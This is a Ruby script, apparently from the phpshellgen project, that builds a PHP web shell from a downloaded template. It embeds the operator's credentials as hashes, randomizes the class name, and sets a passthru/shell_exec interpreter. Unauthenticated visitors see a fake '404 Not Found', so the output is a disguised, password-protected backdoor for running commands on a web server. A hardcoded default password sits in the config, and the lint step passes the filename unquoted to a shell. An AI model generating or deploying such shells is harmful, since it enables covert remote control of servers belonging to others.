#!/usr/bin/env ruby
require 'rubygems'
require 'getoptlong'
require 'digest/sha1'
require 'open-uri'
#
def header
	puts "PHP-Shell Generator"
	puts "http://www.cixtor.com/phpshell"
	puts "https://github.com/cixtor/phpshellgen"
	puts
end
def usage
	header
	puts "Options:"
	puts "  -h | --help     = Print this message with the list of available options."
	puts "  -i | --input    = Specify the shell template to use in compilation. Default: official cixtor/phpshellgen repository"
	puts "  -o | --output   = Specify the filename of the output (you should specify the extension too)."
	puts "  -s | --shell    = Specify the default interpreter to use, you can chage this using the method 'set_interpreter(shell_exec)' once you are logged in."
	puts "  -u | --username = Specify the username to log into the php-shell, if you are not authenticated the shell will responde with a '404 Not Found'."
	puts "  -p | --password = Specify the password to log into the php-shell."
	puts "  -l | --lint     = Enable the check of the php-shell using the linter utility of PHP."
	puts "Methods:"
	puts "  set_interpreter = Change the default interpreter used in the compiled php-shell: set_interpreter(shell_exec)"
	puts "  logout          = Destroy the current session and display the 'Not Found' message."
	puts "  cd 'path'       = Change the current working directory and store this value in session to stay present while you execute other commands."
	puts "Usage:"
	puts "  ./compile.rb -i template.php -o shell.php"
	puts "  ./compile.rb -i template.php -s 'shell_exec'"
	puts "  ./compile.rb -i template.php -o shell.php -u 'USERNAME' -p 'PASSWORD'"
	exit
end
def get_jquery
	# request = open('http://code.jquery.com/jquery.min.js')
	# request = open('http://www.cixtor.com/assets/jquery.min.js')
	request = open('https://raw.github.com/cixtor/phpshellgen/master/jquery.min.js')
	request.read
end
def get_jquery_terminal
	# request = open('http://www.cixtor.com/assets/jquery.terminal.min.js')
	request = open('https://raw.github.com/cixtor/phpshellgen/master/jquery.terminal.min.js')
	request.read
end
def get_template(config)
	if config[:input].nil? then
		puts "    Downloading official \e[0;93mcixtor/phpshellgen\e[0m repository template"
		config[:input] = 'https://raw.github.com/cixtor/phpshellgen/master/template.php'
		request = open(config[:input])
		request.read
	elsif File.exists?(config[:input]) then
		puts "    Using shell template specified: \e[0;93m#{config[:input]}\e[0m"
		File.open(config[:input],'r')
	else
		usage
	end
end
#
config = {
	:input => nil,
	:output => 'cixtor.phpshellgen.php',
	:shell => 'passthru',
	:username => 'cixtor',
	:password => '98ogHDPcPU',
	:username_hash => '',
	:password_hash => '',
	:lint => false,
	:class_name => 'Shell'
}
options = GetoptLong.new(
	[ '--input', '-i', GetoptLong::OPTIONAL_ARGUMENT ],
	[ '--output', '-o', GetoptLong::OPTIONAL_ARGUMENT ],
	[ '--shell', '-s', GetoptLong::OPTIONAL_ARGUMENT ],
	[ '--username', '-u', GetoptLong::OPTIONAL_ARGUMENT ],
	[ '--password', '-p', GetoptLong::OPTIONAL_ARGUMENT ],
	[ '--lint', '-l', GetoptLong::NO_ARGUMENT ],
	[ '--help', '-h', GetoptLong::NO_ARGUMENT ]
)
#
begin
	options.each do |option, args|
		case option
			when '--input'
				config[:input] = args
			when '--output'
				config[:output] = args
			when '--shell'
				config[:shell] = args
			when '--username'
				config[:username] = args
			when '--password'
				config[:password] = args
			when '--lint'
				config[:lint] = true
			when '--help'
				usage
			else raise('Invalid option, use --help to get a list of available options.')
		end
	end
rescue GetoptLong::InvalidOption => e
	usage
end
#
header
class_name_length = rand(10)+5
allowed_chars = ('a'..'z').to_a + ('A'..'Z').to_a
config[:username_hash] = Digest::SHA1.hexdigest(config[:username])
config[:password_hash] = Digest::SHA1.hexdigest(config[:password])
config[:class_name] = Array.new(class_name_length, '').collect{ allowed_chars[rand(allowed_chars.size)] }.join('')
#
puts "\e[0;92mOK.\e[0m Compiling shell into file: '\e[0;94m#{config[:output]}\e[0m'"
puts "    Randomizing Shell class name: \e[0;93m#{config[:class_name]}\e[0m"
output = File.new(config[:output],'w')
template = get_template(config)
#
template.each_line do |line|
	line = line.chomp
	if line.match(/'username'=>'([a-z0-9]{40})',/) then
		puts "    Hashing username: \e[0;93m#{config[:username]}\e[0m"
		output.write("'username'=>'#{config[:username_hash]}',")
	elsif line.match(/'password'=>'([a-z0-9]{40})',/) then
		puts "    Hashing password: \e[0;93m#{config[:password]}\e[0m"
		output.write("'password'=>'#{config[:password_hash]}',")
	elsif line.match(/'interpreter'=>'(.*)',/)
		puts "    Settings default interpreter: \e[0;93m#{config[:shell]}\e[0m"
		output.write("'interpreter'=>'#{config[:shell]}',")
	elsif match = line.match(/(class Shell\{)/) or match = line.match(/(new Shell\(\))/) then
		output.write(match[1].gsub('Shell', config[:class_name]))
	elsif line.match(/<script type="text\/javascript" src="jquery.min.js"><\/script>/) then
		puts "    Adding jQuery support."
		output.write("<script type='text/javascript'>")
		output.write(get_jquery)
		output.write("</script>")
	elsif line.match(/^<\?php$/) then
		output.write("<?php ")
	elsif line.match(/<script type="text\/javascript" src="jquery.terminal.min.js"><\/script>/) then
		puts "    Adding jQuery.Terminal support."
		output.write("<script type='text/javascript'>")
		output.write(get_jquery_terminal)
		output.write("</script>")
	else
		line = line.gsub("\t",'')
		output.write(line)
	end
end
%x{php -l #{config[:output]}} if config[:lint]==true
puts "\e[0;92mOK.\e[0m Finished"
output.close
#